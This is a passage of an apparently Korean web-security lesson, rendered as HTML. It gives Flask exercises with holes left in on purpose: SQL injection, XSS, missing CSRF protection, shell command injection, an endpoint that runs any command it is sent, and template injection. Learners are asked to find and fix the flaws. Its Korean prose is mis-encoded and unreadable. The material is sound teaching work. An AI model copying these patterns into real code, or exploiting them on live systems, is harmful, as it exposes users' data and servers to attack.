<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/products&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_products</span><span class="p">():</span>
    <span class="n">category</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;category&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">min_price</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;min_price&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
    <span class="n">max_price</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;max_price&#39;</span><span class="p">,</span> <span class="s1">&#39;99999&#39;</span><span class="p">)</span>
    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;shop.db&#39;</span><span class="p">)</span>
    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        SELECT id, name, price, description</span>
<span class="s2">        FROM products</span>
<span class="s2">        WHERE category = &#39;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">&#39;</span>
<span class="s2">        AND price BETWEEN </span><span class="si">{</span><span class="n">min_price</span><span class="si">}</span><span class="s2"> AND </span><span class="si">{</span><span class="n">max_price</span><span class="si">}</span>
<span class="s2">        ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span>
<span class="s2">    &quot;&quot;&quot;</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>

<span class="c1"># ì§ˆë¬¸:</span>
<span class="c1"># 1. ì¸ì ì…˜ í¬ì¸íŠ¸ê°€ ëª‡ ê°œì…ë‹ˆê¹Œ? (ê°ê° ì‹ë³„)</span>
<span class="c1"># 2. ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ëª¨ë“  í…Œì´ë¸” ì´ë¦„ì„ ì¶”ì¶œí•˜ëŠ” í˜ì´ë¡œë“œ ì‘ì„±</span>
<span class="c1"># 3. ëª¨ë“  ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¶œí•˜ëŠ” í˜ì´ë¡œë“œ ì‘ì„±</span>
<span class="c1"># 4. ëª¨ë“  ì¸ì ì…˜ ë²¡í„°ë¥¼ ë°©ì§€í•˜ë„ë¡ ì½”ë“œ ìˆ˜ì •</span>
</code></pre></div>

<h3 id="2-xss">ì—°ìŠµ ë¬¸ì œ 2: XSS ì±Œë¦°ì§€<a class="header-link" href="#2-xss" title="Permanent link">&para;</a></h3>
<p>ì´ í…œí”Œë¦¿ê³¼ ë°±ì—”ë“œì˜ ëª¨ë“  XSS ì·¨ì•½ì ì„ ìˆ˜ì •í•˜ì„¸ìš”:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ì—°ìŠµ ë¬¸ì œ: ì´ ë¸”ë¡œê·¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ëª¨ë“  XSS ì·¨ì•½ì ì„ ìˆ˜ì •í•˜ì„¸ìš”.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">BLOG_TEMPLATE</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;</span>
<span class="s2">&lt;head&gt;</span>
<span class="s2">    &lt;title&gt;{{ title }}&lt;/title&gt;</span>
<span class="s2">    &lt;style&gt;</span>
<span class="s2">        .highlight { color: &quot;&quot;&quot;</span> <span class="o">+</span> <span class="s2">&quot;{{ highlight_color }}&quot;</span> <span class="o">+</span> <span class="s2">&quot;&quot;&quot;; }</span>
<span class="s2">    &lt;/style&gt;</span>
<span class="s2">&lt;/head&gt;</span>
<span class="s2">&lt;body&gt;</span>
<span class="s2">    &lt;h1&gt;Blog Post&lt;/h1&gt;</span>

<span class="s2">    &lt;!-- ê²€ìƒ‰ ê²°ê³¼ --&gt;</span>
<span class="s2">    &lt;p&gt;Showing results for: &quot;&quot;&quot;</span> <span class="o">+</span> <span class="s2">&quot;{{ search_query }}&quot;</span> <span class="o">+</span> <span class="s2">&quot;&quot;&quot;&lt;/p&gt;</span>

<span class="s2">    &lt;!-- ê²Œì‹œë¬¼ ë‚´ìš© (í¬ë§¤íŒ…ì„ ìœ„í•´ HTML í—ˆìš©) --&gt;</span>
<span class="s2">    &lt;div class=&quot;content&quot;&gt;{{ post_content|safe }}&lt;/div&gt;</span>

<span class="s2">    &lt;!-- ì‚¬ìš©ì ëŒ“ê¸€ --&gt;</span>
<span class="s2">    &lt;div class=&quot;comment&quot; data-author=&quot;{{ comment_author }}&quot;&gt;</span>
<span class="s2">        {{ comment_text }}</span>
<span class="s2">    &lt;/div&gt;</span>

<span class="s2">    &lt;!-- ê³µìœ  ë²„íŠ¼ --&gt;</span>
<span class="s2">    &lt;a href=&quot;javascript:share(&#39;{{ share_url }}&#39;)&quot;&gt;Share&lt;/a&gt;</span>

<span class="s2">    &lt;script&gt;</span>
<span class="s2">        var userName = &#39;{{ current_user }}&#39;;</span>
<span class="s2">        var searchTerm = &#39;{{ search_query }}&#39;;</span>
<span class="s2">        document.getElementById(&#39;welcome&#39;).innerHTML =</span>
<span class="s2">            &#39;Welcome, &#39; + userName;</span>
<span class="s2">    &lt;/script&gt;</span>
<span class="s2">&lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/blog&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">blog</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">BLOG_TEMPLATE</span><span class="p">,</span>
        <span class="n">title</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;My Blog&#39;</span><span class="p">),</span>
        <span class="n">highlight_color</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;color&#39;</span><span class="p">,</span> <span class="s1">&#39;blue&#39;</span><span class="p">),</span>
        <span class="n">search_query</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">post_content</span><span class="o">=</span><span class="n">get_post_content</span><span class="p">(),</span>  <span class="c1"># DBì—ì„œ, ì‚¬ìš©ì HTML í¬í•¨ ê°€ëŠ¥</span>
        <span class="n">comment_author</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">comment_text</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;comment&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">share_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">current_user</span><span class="o">=</span><span class="n">get_current_username</span><span class="p">(),</span>
    <span class="p">)</span>

<span class="c1"># ì§ˆë¬¸:</span>
<span class="c1"># 1. ëª¨ë“  XSS ë²¡í„° ì‹ë³„ (ìµœì†Œ 6ê°œ)</span>
<span class="c1"># 2. ê°ê°ì— ëŒ€í•´ ì–´ë–¤ ìœ í˜•ì¸ì§€ ì„¤ëª… (reflected, stored, DOM)</span>
<span class="c1"># 3. ì ì ˆí•œ ì¸ì½”ë”©ìœ¼ë¡œ ê° ì·¨ì•½ì  ìˆ˜ì •</span>
<span class="c1"># 4. Content Security Policy í—¤ë” ì¶”ê°€</span>
</code></pre></div>

<h3 id="3-csrf">ì—°ìŠµ ë¬¸ì œ 3: CSRF ë°©ì–´<a class="header-link" href="#3-csrf" title="Permanent link">&para;</a></h3>
<p>ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ì™„ì „í•œ CSRF ë°©ì–´ë¥¼ êµ¬í˜„í•˜ì„¸ìš”:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ì—°ìŠµ ë¬¸ì œ: ëª¨ë“  ìƒíƒœ ë³€ê²½ ì—”ë“œí¬ì¸íŠ¸ì— CSRF ë°©ì–´ ì¶”ê°€.</span>
<span class="sd">í† í° ê¸°ë°˜ê³¼ SameSite ì¿ í‚¤ ë³´í˜¸ ëª¨ë‘ êµ¬í˜„.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">session</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;change-me&#39;</span>

<span class="c1"># ì´ ì—”ë“œí¬ì¸íŠ¸ë“¤ì€ CSRF ë°©ì–´ê°€ í•„ìš”:</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/transfer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">transfer_money</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ê³„ì • ê°„ ì†¡ê¸ˆ.&quot;&quot;&quot;</span>
    <span class="n">from_account</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span>
    <span class="n">to_account</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span>
    <span class="n">amount</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;amount&#39;</span><span class="p">]</span>
    <span class="c1"># TODO: CSRF ë°©ì–´ ì¶”ê°€</span>
    <span class="k">return</span> <span class="n">do_transfer</span><span class="p">(</span><span class="n">from_account</span><span class="p">,</span> <span class="n">to_account</span><span class="p">,</span> <span class="n">amount</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/profile&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;PUT&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">update_profile</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;AJAXë¥¼ í†µí•œ ì‚¬ìš©ì í”„ë¡œí•„ ì—…ë°ì´íŠ¸.&quot;&quot;&quot;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span>
    <span class="c1"># TODO: AJAX ìš”ì²­ì„ ìœ„í•œ CSRF ë°©ì–´ ì¶”ê°€</span>
    <span class="k">return</span> <span class="n">update_user_profile</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/delete-account&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;DELETE&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">delete_account</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì‚¬ìš©ì ê³„ì • ì˜êµ¬ ì‚­ì œ.&quot;&quot;&quot;</span>
    <span class="c1"># TODO: CSRF ë°©ì–´ + ì¶”ê°€ í™•ì¸ ì¶”ê°€</span>
    <span class="k">return</span> <span class="n">delete_user_account</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>

<span class="c1"># ìš”êµ¬ì‚¬í•­:</span>
<span class="c1"># 1. csrf_protect ë°ì½”ë ˆì´í„° êµ¬í˜„</span>
<span class="c1"># 2. CSRF í† í° ìƒì„± ë° ê²€ì¦</span>
<span class="c1"># 3. í¼ ì œì¶œê³¼ AJAX ìš”ì²­ ëª¨ë‘ ì²˜ë¦¬</span>
<span class="c1"># 4. SameSite ì¿ í‚¤ ì„¤ì •</span>
<span class="c1"># 5. ëª¨ë“  í¼ê³¼ AJAX í˜¸ì¶œì— í† í° ì¶”ê°€</span>
</code></pre></div>

<h3 id="4-command-injection">ì—°ìŠµ ë¬¸ì œ 4: Command Injection ë°©ì§€<a class="header-link" href="#4-command-injection" title="Permanent link">&para;</a></h3>
<p>ì´ íŒŒì¼ ê´€ë¦¬ APIë¥¼ ì¸ì ì…˜ ì•ˆì „í•˜ê²Œ ë‹¤ì‹œ ì‘ì„±í•˜ì„¸ìš”:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ì—°ìŠµ ë¬¸ì œ: ëª¨ë“  ì—”ë“œí¬ì¸íŠ¸ë¥¼ command injection ë°©ì§€í•˜ë„ë¡ ë‹¤ì‹œ ì‘ì„±.</span>
<span class="sd">ê°€ëŠ¥í•œ ê²½ìš° ì…¸ ëª…ë ¹ ëŒ€ì‹  Python ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/files/list&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">list_files</span><span class="p">():</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ls -la </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;files&quot;</span><span class="p">:</span> <span class="n">output</span><span class="p">})</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/files/search&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_files</span><span class="p">():</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pattern&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;find </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1"> -name &quot;</span><span class="si">{</span><span class="n">pattern</span><span class="si">}</span><span class="s1">&quot;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;results&quot;</span><span class="p">:</span> <span class="n">output</span><span class="p">})</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/files/compress&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">compress</span><span class="p">():</span>
    <span class="n">files</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">,</span> <span class="p">[])</span>
    <span class="n">output_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">,</span> <span class="s1">&#39;archive.tar.gz&#39;</span><span class="p">)</span>
    <span class="n">file_list</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tar czf </span><span class="si">{</span><span class="n">output_name</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">file_list</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;compressed&quot;</span><span class="p">})</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/system/info&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">system_info</span><span class="p">():</span>
    <span class="n">command</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;uname -a&#39;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">output</span><span class="p">})</span>

<span class="c1"># ìš”êµ¬ì‚¬í•­:</span>
<span class="c1"># 1. ì…¸ ëª…ë ¹ì„ Python ë“±ê°€ë¬¼ë¡œ ëŒ€ì²´</span>
<span class="c1"># 2. ëª¨ë“  ë§¤ê°œë³€ìˆ˜ì— ëŒ€í•œ ì…ë ¥ ê²€ì¦ ì¶”ê°€</span>
<span class="c1"># 3. ê²½ë¡œ íƒìƒ‰ ê³µê²© ë°©ì§€</span>
<span class="c1"># 4. system_info ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì™„ì „íˆ ì œê±° (ë°±ë„ì–´!)</span>
</code></pre></div>

<h3 id="5">ì—°ìŠµ ë¬¸ì œ 5: ì „ì²´ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ ê²€í† <a class="header-link" href="#5" title="Permanent link">&para;</a></h3>
<p>ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ëŒ€í•œ ë³´ì•ˆ ê²€í† ë¥¼ ìˆ˜í–‰í•˜ê³  ëª¨ë“  ì¸ì ì…˜ ì·¨ì•½ì ì„ ìˆ˜ì •í•˜ì„¸ìš”:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ì—°ìŠµ ë¬¸ì œ: ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ëŠ” ì´ ë ˆìŠ¨ì—ì„œ ë‹¤ë£¬ ê° ì¸ì ì…˜ ìœ í˜•ì˜ ì·¨ì•½ì ì´</span>
<span class="sd">ìµœì†Œ í•˜ë‚˜ì”© ìˆìŠµë‹ˆë‹¤:</span>
<span class="sd">- SQL Injection</span>
<span class="sd">- XSS (Reflected ë° Stored)</span>
<span class="sd">- CSRF</span>
<span class="sd">- Command Injection</span>
<span class="sd">- SSTI</span>

<span class="sd">ëª¨ë‘ ì°¾ì•„ì„œ ìˆ˜ì •í•˜ì„¸ìš”. CSP í—¤ë”ë¥¼ í¬í•¨í•œ ì‹¬ì¸µ ë°©ì–´ ì¡°ì¹˜ ì¶”ê°€.</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">session</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;dev-key&#39;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">():</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;app.db&#39;</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;SELECT * FROM articles WHERE title LIKE &#39;%</span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">%&#39;&quot;</span>
    <span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;&lt;h1&gt;Results for: </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">&lt;/h1&gt;&quot;</span> <span class="o">+</span>
        <span class="s2">&quot;&lt;ul&gt;{</span><span class="si">% f</span><span class="s2">or r in results %}&lt;li&gt;{{ r[1] }}&lt;/li&gt;{</span><span class="si">% e</span><span class="s2">ndfor %}&lt;/ul&gt;&quot;</span><span class="p">,</span>
        <span class="n">results</span><span class="o">=</span><span class="n">results</span>
    <span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/comment&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_comment</span><span class="p">():</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;app.db&#39;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;INSERT INTO comments (text) VALUES (&#39;</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="s2">&quot;Comment added&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/preview&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">preview</span><span class="p">():</span>
    <span class="n">template</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;p&gt;Hello&lt;/p&gt;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/export&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">export</span><span class="p">():</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s1">&#39;data.csv&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;cp uploads/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1"> /tmp/export_</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="s2">&quot;Exported&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">update_profile</span><span class="p">():</span>
    <span class="c1"># CSRF í† í° í™•ì¸ ì—†ìŒ</span>
    <span class="n">bio</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">]</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;app.db&#39;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;UPDATE users SET bio = &#39;</span><span class="si">{</span><span class="n">bio</span><span class="si">}</span><span class="s2">&#39; WHERE id = </span><span class="si">{</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="s2">&quot;Updated&quot;</span>
</code></pre></div>

<hr />
<h2 id="11">11. ìš”ì•½<a class="header-link" href="#11" title="Permanent link">&para;</a></h2>
